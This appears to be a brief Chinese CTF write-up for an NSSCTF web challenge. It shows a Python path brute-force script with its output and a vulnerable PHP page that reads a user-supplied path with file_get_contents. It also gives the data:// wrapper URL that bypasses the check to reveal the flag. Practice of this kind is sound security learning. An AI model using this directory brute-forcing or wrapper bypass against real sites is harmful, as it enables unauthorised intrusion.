-
- > 复现
- # 思路
	- 爆
		- ```python
		  def test_uri(uri):
		      r = base_get(url + "/" + uri.removeprefix("/"), acceptable_code=None)
		      return len(r.text) if r.status_code else -r.status_code
		  
		  auto_burst_resp_len_multi(
		      test_uri,
		      fileread.readlinesfrom("../HandyFuzzDict/httppath.txt")
		  )
		  ```
	- 得
		- ```
		    0%|          | 0/235 [00:00<?, ?it/s]
		  INFO:root:[Auto Burst] Get: 67 Arg: .git
		  INFO:root:[Auto Burst] Get: 67 Arg: .git/HEAD
		    4%|▍         | 10/235 [00:00<00:04, 50.64it/s]INFO:root:[Auto Burst] Get: 169 Arg: source.php
		   35%|███▌      | 83/235 [00:01<00:03, 50.24it/s]INFO:root:[Auto Burst] Get: 190 Arg: www.rar
		  100%|██████████| 235/235 [00:05<00:00, 46.38it/s]
		  ```
	- 看
		- `http://node2.anna.nssctf.cn:28329/orzorz.php`
		- ```php
		   <?php
		  error_reporting(0);
		  if(isset($_GET['cxk'])){
		      $cxk=$_GET['cxk'];
		      if(file_get_contents($cxk)=="ctrl"){
		          echo $flag;
		      }else{
		          echo "洗洗睡吧";
		      }
		  }else{
		      echo "nononoononoonono";
		  }
		  ?> 
		  ```
	- 绕
		- ```
		  http://node2.anna.nssctf.cn:28329/orzorz.php?cxk=data://text/plain,ctrl
		  ```